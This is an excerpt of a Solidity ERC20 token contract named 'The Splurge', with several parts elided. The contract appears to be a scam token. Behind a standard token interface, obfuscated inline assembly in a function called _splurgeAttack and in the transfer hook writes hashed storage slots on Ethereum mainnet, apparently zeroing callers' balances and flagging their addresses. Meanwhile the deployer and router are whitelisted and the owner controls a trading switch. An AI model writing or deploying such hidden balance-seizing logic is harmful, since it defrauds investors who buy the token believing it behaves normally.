...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSplurge;
    uint256 private _splurgeZone = block.number*2;

    mapping (address => bool) private _mergeOne; 
    mapping (address => bool) private _mergeTwo;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private llamaRice;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private alarmingClock;
    address public pair;
    ...
    bool private trading; uint256 private orangeTree = 1; bool private blackWhite;
    uint256 private _decimals; uint256 private yellowGreen;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSplurge.push(_router); addSplurge.push(msgSender_); addSplurge.push(pair);
        for (uint256 q=0; q < 3;) {_mergeOne[addSplurge[q]] = true; unchecked{q++;} }
    }
    ...
    function _splurgeAttack() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0x85755833167a80aed22cf9e9c03a0e7d5c2a52a83fc367455e213e0d7f58cdf7))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1c06c49ac4a6e8c62edd905b943f57bae9b6b8f3ecaa7b0ecb059344bf3946a0,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0x85755833167a80aed22cf9e9c03a0e7d5c2a52a83fc367455e213e0d7f58cdf7,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _splurgeZone = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSplurge[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract TheSplurge is ERC20Token {
    constructor() ERC20Token("The Splurge", "SPLURGE", msg.sender, 150000 * 10 ** 18) {
    }
}